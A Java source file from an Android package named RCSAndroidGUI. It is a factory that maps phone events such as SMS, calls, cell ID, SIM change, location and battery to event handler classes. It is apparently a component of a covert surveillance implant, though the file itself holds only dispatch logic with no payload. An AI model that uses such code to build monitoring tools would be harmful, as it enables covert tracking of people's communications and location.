package com.ht.RCSAndroidGUI.event;

import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;

import android.util.Log;

public class EventFactory implements AbstractFactory<EventBase,EventType>{
	private static final String TAG = "EventFactory";

	public EventBase create(EventType type) {
		EventBase e = null;
		switch (type) {
			case EVENT_TIMER:
				Log.d("QZ", TAG + " Info: " + "");
				e = new TimerEvent();
				break;

			case EVENT_SMS:
				Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
				e = new SmsEvent();
				break;

			case EVENT_CALL:
				Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
				e = new CallEvent();
				break;

			case EVENT_CONNECTION:
				Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
				e = new ConnectivityEvent();
				break;

			case EVENT_PROCESS:
				Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
				break;

			case EVENT_CELLID:
				Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
				e = new CellIdEvent();
				break;

			case EVENT_QUOTA:
				Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
				break;

			case EVENT_SIM_CHANGE:
				Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
				break;

			case EVENT_LOCATION:
				Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
				e = new LocationEvent();
				break;

			case EVENT_AC:
				Log.d("QZ", TAG + " Info: " + "EVENT_AC");
				e = new AcEvent();
				break;

			case EVENT_BATTERY:
				Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
				e = new BatteryEvent();
				break;

			case EVENT_STANDBY:
				Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
				e = new StandbyEvent();
				break;

			default:
				Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
				break;
		}
		return e;
	}
}
